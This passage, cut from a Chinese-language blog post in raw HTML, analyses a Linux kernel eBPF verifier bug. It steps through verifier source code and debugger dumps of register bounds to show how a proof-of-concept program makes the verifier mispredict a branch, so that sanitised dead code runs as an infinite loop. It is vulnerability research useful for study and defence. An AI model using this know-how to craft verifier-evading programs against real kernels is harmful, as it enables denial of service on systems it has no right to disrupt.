class="title">sanitize_dead_code</span><span class="params">(struct bpf_verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn_aux_data</span> *<span class="title">aux_data</span> = <span class="title">env</span>-&gt;<span class="title">insn_aux_data</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">trap</span> = <span class="title">BPF_JMP_IMM</span>(<span class="title">BPF_JA</span>, 0, 0, -1);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span> = <span class="title">env</span>-&gt;<span class="title">prog</span>-&gt;<span class="title">insnsi</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn_cnt; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (aux_data[i].seen)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(insn + i, &amp;trap, <span class="keyword">sizeof</span>(trap));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注释写的很清楚，这个函数会将所有的<code>dead code</code>改为<code>goto pc-1</code>，这样就能解释清楚<code>Poc</code>中10，11这两句不合法语句的来历了</p>
<p>内核在检查程序合法性的过程中，第9句在检查时被判断为恒成立，之后的检查便只检查了第12句，第10和第11句被视为<code>dead code</code>，在之后的<code>sanitize_dead_code</code>函数中被修改为<code>goto pc-1</code>。而没有想到的是，在实际执行的时候第9句实际上是恒不成立，因此就导致程序执行了<code>goto pc-1</code>。在实际执行跳转指令的时候，跳转的偏移会默认加1，因此实际上<code>goto pc-1</code>跳转到的地方不是自己的上一条，而是自己，这就导致程序空转，陷入死循环</p>
<p>那么为什么在检查的时候第九句的状态和实际执行时的状态不同呢？我们来一步步动态地分析一下</p>
<p>在分析之前，要先了解寄存器结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">enum</span> bpf_reg_type type;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="comment">/* valid when type == PTR_TO_PACKET */</span></span><br><span class="line">		u16 range;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">		u32 btf_id; <span class="comment">/* for PTR_TO_BTF_ID */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Max size from any of the above. */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> raw;</span><br><span class="line">	&#125;;</span><br><span class="line">	s32 off;</span><br><span class="line">	u32 id;</span><br><span class="line">	u32 ref_obj_id;</span><br><span class="line">	<span class="comment">/* For scalar types (SCALAR_VALUE), this represents our knowledge of</span></span><br><span class="line"><span class="comment">	 * the actual value.</span></span><br><span class="line"><span class="comment">	 * For pointer types, this represents the variable part of the offset</span></span><br><span class="line"><span class="comment">	 * from the pointed-to object, and is shared with all bpf_reg_states</span></span><br><span class="line"><span class="comment">	 * with the same id as us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span></span><br><span class="line">	<span class="comment">/* Used to determine if any memory access using this register will</span></span><br><span class="line"><span class="comment">	 * result in a bad access.</span></span><br><span class="line"><span class="comment">	 * These refer to the same value as var_off, not necessarily the actual</span></span><br><span class="line"><span class="comment">	 * contents of the register.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s64 smin_value; <span class="comment">/* minimum possible (s64)value */</span></span><br><span class="line">	s64 smax_value; <span class="comment">/* maximum possible (s64)value */</span></span><br><span class="line">	u64 umin_value; <span class="comment">/* minimum possible (u64)value */</span></span><br><span class="line">	u64 umax_value; <span class="comment">/* maximum possible (u64)value */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">	u32 frameno;</span><br><span class="line">	s32 subreg_def;</span><br><span class="line">	<span class="keyword">enum</span> bpf_reg_liveness live;</span><br><span class="line">	<span class="comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don't affect safety */</span></span><br><span class="line">	<span class="keyword">bool</span> precise;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>理解该漏洞之前要先理解该结构体，要注意的一个字段是<code>var_off</code>，它是一个<code>tnum</code>结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* tnum: tracked (or tristate) numbers</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A tnum tracks knowledge about the bits of a value.  Each bit can be either</span></span><br><span class="line"><span class="comment"> * known (0 or 1), or unknown (x).  Arithmetic operations on tnums will</span></span><br><span class="line"><span class="comment"> * propagate the unknown bits such that the tnum result represents all the</span></span><br><span class="line"><span class="comment"> * possible results for possible values of the operands.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">	u64 value;</span><br><span class="line">	u64 mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><del><code>tnum</code>的注释没太懂，我的理解是：</del></p>
<ul>
<li><del><code>mask</code>为0的时候，表示该<code>tnum</code>是一个数字，值为<code>value</code></del></li>
<li><del><code>mask</code>非0的时候，表示一个范围，所有与<code>mask</code>进行与操作不为0的数字都在这个范围内，而此时的<code>value</code>只是该范围内的一个数字，并不精确</del></li>
</ul>
<p>引用自<a href="https://www.anquanke.com/post/id/203416" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203416</a></p>
<blockquote>
<p><code>value</code>: 某个bit为1 表示这个寄存器的这个bit 确定是1</p>
<p><code>mask</code>: 某个bit 为1表示这个 bit 是未知的</p>
<p>举个栗子，假如<code>value</code> 是 <code>010</code>（二进制表示) ， <code>mask</code> 是<code>100</code> , 那么就是经过前面的指令的模拟执行之后，可以确定这个寄存器的 第二个bit 一定是 1, 第三个 bit 在<code>mask</code> 里面设置了，表示这里不确定，可以是1或者是0。详细的文档可以在<code>Documentnetworking/filter.txt</code> 里面找到。</p>
</blockquote>
<h3 id="0-b7-r0-808464432"><a href="#0-b7-r0-808464432" class="headerlink" title="0: (b7) r0 = 808464432"></a>0: (b7) r0 = 808464432</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x30303030</span>,</span><br><span class="line">    mask = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x30303030</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，r0存储着一个确定的值，为0x30303030</p>
<h3 id="1-7f-r0-gt-gt-r0"><a href="#1-7f-r0-gt-gt-r0" class="headerlink" title="1: (7f) r0 &gt;&gt;= r0"></a>1: (7f) r0 &gt;&gt;= r0</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0xffffffffffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x8000000000000000</span>,</span><br><span class="line">  smax_value = <span class="number">0x7fffffffffffffff</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>var_off</code>改变了，变为了一个完全不确定的值，且<code>smin_value, smax_value, umin_value, umax_value</code>都变为了相应范围的最大最小值</p>
<p>相应代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_RSH:</span><br><span class="line">		<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span><br><span class="line">			<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span><br><span class="line"><span class="comment">			 * This includes shifts by a negative number.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		scalar_min_max_rsh(dst_reg, &amp;src_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>这里的<code>umax_val</code>就是<code>r0-&gt;umax_val</code>，在执行到这里的时候，为<code>0x30303030</code>，大于<code>insn_bitness</code>即64，所以就会标记寄存器为<code>unknown</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mark_reg_unknown</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">			     struct bpf_reg_state *regs, u32 regno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (WARN_ON(regno &gt;= MAX_BPF_REG)) &#123;</span><br><span class="line">		verbose(env, <span class="string">"mark_reg_unknown(regs, %u)\n"</span>, regno);</span><br><span class="line">		<span class="comment">/* Something bad happened, let's kill all regs except FP */</span></span><br><span class="line">		<span class="keyword">for</span> (regno = <span class="number">0</span>; regno &lt; BPF_REG_FP; regno++)</span><br><span class="line">			__mark_reg_not_init(env, regs + regno);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	__mark_reg_unknown(env, regs + regno);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_unknown(<span class="keyword">const</span> struct bpf_verifier_env *env,</span><br><span class="line">			       struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Clear type, id, off, and union(map_ptr, range) and</span></span><br><span class="line"><span class="comment">	 * padding between 'type' and union</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">memset</span>(reg, <span class="number">0</span>, offsetof(struct bpf_reg_state, var_off));</span><br><span class="line">	reg-&gt;type = SCALAR_VALUE;</span><br><span class="line">	reg-&gt;var_off = tnum_unknown;</span><br><span class="line">	reg-&gt;frameno = <span class="number">0</span>;</span><br><span class="line">	reg-&gt;precise = env-&gt;subprog_cnt &gt; <span class="number">1</span> || !env-&gt;allow_ptr_leaks ?</span><br><span class="line">		       <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">	__mark_reg_unbounded(reg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_unbounded(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;smin_value = S64_MIN;</span><br><span class="line">	reg-&gt;smax_value = S64_MAX;</span><br><span class="line">	reg-&gt;umin_value = <span class="number">0</span>;</span><br><span class="line">	reg-&gt;umax_value = U64_MAX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>mark_reg_unknown</code>总共做了这些事：</p>
<ul>
<li>reg-&gt;type = SCALAR_VALUE</li>
<li>reg-&gt;var_off = {0, 0xffffffffffffffff}</li>
<li>reg-&gt;smin_value = 0x8000000000000000</li>
<li>reg-&gt;smax_value = 0x7fffffffffffffff</li>
<li>reg-&gt;umin_value = 0</li>
<li>reg-&gt;umax_value = 0xffffffffffffffff</li>
</ul>
<h3 id="2-14-w0-808464432"><a href="#2-14-w0-808464432" class="headerlink" title="2: (14) w0 -= 808464432"></a>2: (14) w0 -= 808464432</h3><p>主要代码位于<code>adjust_scalar_min_max_vals</code>函数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">				      struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">				      struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				      struct bpf_reg_state src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">regs</span> = <span class="title">cur_regs</span>(<span class="title">env</span>);</span></span><br><span class="line">	u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">	<span class="keyword">bool</span> src_known, dst_known;</span><br><span class="line">	s64 smin_val, smax_val;</span><br><span class="line">	u64 umin_val, umax_val;</span><br><span class="line">	u64 insn_bitness = (BPF_CLASS(insn-&gt;code) == BPF_ALU64) ? <span class="number">64</span> : <span class="number">32</span>;</span><br><span class="line">	u32 dst = insn-&gt;dst_reg;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (insn_bitness == <span class="number">32</span>) &#123;</span><br><span class="line">		<span class="comment">/* Relevant for 32-bit RSH: Information can propagate towards</span></span><br><span class="line"><span class="comment">		 * LSB, so it isn't sufficient to only truncate the output to</span></span><br><span class="line"><span class="comment">		 * 32 bits.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		coerce_reg_to_size(dst_reg, <span class="number">4</span>);</span><br><span class="line">		coerce_reg_to_size(&amp;src_reg, <span class="number">4</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	smin_val = src_reg.smin_value;</span><br><span class="line">	smax_val = src_reg.smax_value;</span><br><span class="line">	umin_val = src_reg.umin_value;</span><br><span class="line">	umax_val = src_reg.umax_value;</span><br><span class="line">	src_known = tnum_is_const(src_reg.var_off);</span><br><span class="line">	dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">	……</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">	……</span><br><span class="line">	<span class="keyword">case</span> BPF_SUB:</span><br><span class="line">		ret = sanitize_val_alu(env, insn);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			verbose(env, <span class="string">"R%d tried to sub from different pointers or scalars\n"</span>, dst);</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		&#125;</span><br><span class="line">		scalar_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	……</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) != BPF_ALU64) &#123;</span><br><span class="line">		<span class="comment">/* 32-bit ALU ops are (32,32)-&gt;32 */</span></span><br><span class="line">		coerce_reg_to_size(dst_reg, <span class="number">4</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__update_reg_bounds(dst_reg);</span><br><span class="line">	__reg_deduce_bounds(dst_reg);</span><br><span class="line">	__reg_bound_offset(dst_reg);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于该条指令使用的是32位寄存器，因此会先调用<code>coerce_reg_to_size</code>将寄存器转化为32位的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">coerce_reg_to_size</span><span class="params">(struct bpf_reg_state *reg, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u64 mask;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* clear high bits in bit representation */</span></span><br><span class="line">	reg-&gt;var_off = tnum_cast(reg-&gt;var_off, size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fix arithmetic bounds */</span></span><br><span class="line">	mask = ((u64)<span class="number">1</span> &lt;&lt; (size * <span class="number">8</span>)) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> ((reg-&gt;umin_value &amp; ~mask) == (reg-&gt;umax_value &amp; ~mask)) &#123;</span><br><span class="line">		reg-&gt;umin_value &amp;= mask;</span><br><span class="line">		reg-&gt;umax_value &amp;= mask;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		reg-&gt;umin_value = <span class="number">0</span>;</span><br><span class="line">		reg-&gt;umax_value = mask;</span><br><span class="line">	&#125;</span><br><span class="line">	reg-&gt;smin_value = reg-&gt;umin_value;</span><br><span class="line">	reg-&gt;smax_value = reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转换完之后，寄存器的状态：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0xffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x0</span>,</span><br><span class="line">  smax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x3</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后开始做减法，此时的<code>src_reg</code>其实就是<code>808464432</code>，只不过是用一个暂时的寄存器将其保存了</p>
<p>相关代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_sub</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">			       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	s64 smax_val = src_reg-&gt;smax_value;</span><br><span class="line">	u64 umin_val = src_reg-&gt;umin_value;</span><br><span class="line">	u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (signed_sub_overflows(dst_reg-&gt;smin_value, smax_val) ||</span><br><span class="line">	    signed_sub_overflows(dst_reg-&gt;smax_value, smin_val)) &#123;</span><br><span class="line">		<span class="comment">/* Overflow possible, we know nothing */</span></span><br><span class="line">		dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">		dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		dst_reg-&gt;smin_value -= smax_val;	&lt;-------------</span><br><span class="line">		dst_reg-&gt;smax_value -= smin_val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;umin_value &lt; umax_val) &#123;</span><br><span class="line">		<span class="comment">/* Overflow possible, we know nothing */</span></span><br><span class="line">		dst_reg-&gt;umin_value = <span class="number">0</span>;			&lt;-------------</span><br><span class="line">		dst_reg-&gt;umax_value = U64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* Cannot overflow (as long as bounds are consistent) */</span></span><br><span class="line">		dst_reg-&gt;umin_value -= umax_val;</span><br><span class="line">		dst_reg-&gt;umax_value -= umin_val;</span><br><span class="line">	&#125;</span><br><span class="line">	dst_reg-&gt;var_off = tnum_sub(dst_reg-&gt;var_off, src_reg-&gt;var_off);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>smin_value, smax_value, umin_value, umax_value</code>都是<code>0x30303030</code>，经过两个箭头所指的代码，就将寄存器的状态变成了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0xffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0xffffffffcfcfcfd0</span>,</span><br><span class="line">  smax_value = <span class="number">0xcfcfcfcf</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x3</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行完减法之后，因为<code>BPF_CLASS</code>不是<code>BPF_ALU64</code>，所以其又进行了一次<code>coerce_reg_to_size</code>，之后的寄存器状态如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0xffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x0</span>,</span><br><span class="line">  smax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x3</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后执行完<code>__update_reg_bounds</code>、<code>__reg_deduce_bounds</code>、<code>__reg_bound_offset</code>之后寄存器的状态都没有改变</p>
<p>第四句和第三句一样，是一个算术运算，其流程类似，故不分析</p>
<p>执行完第四句之后，寄存器的状态：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0x1ffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-de-if-w1-s-lt-w0-goto-pc-0"><a href="#5-de-if-w1-s-lt-w0-goto-pc-0" class="headerlink" title="5: (de) if w1 s&lt;= w0 goto pc+0"></a>5: (de) if w1 s&lt;= w0 goto pc+0</h3><p>执行这条语句之前，<code>r0</code>和<code>r1</code>的状态分别为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0x1ffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r1 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> 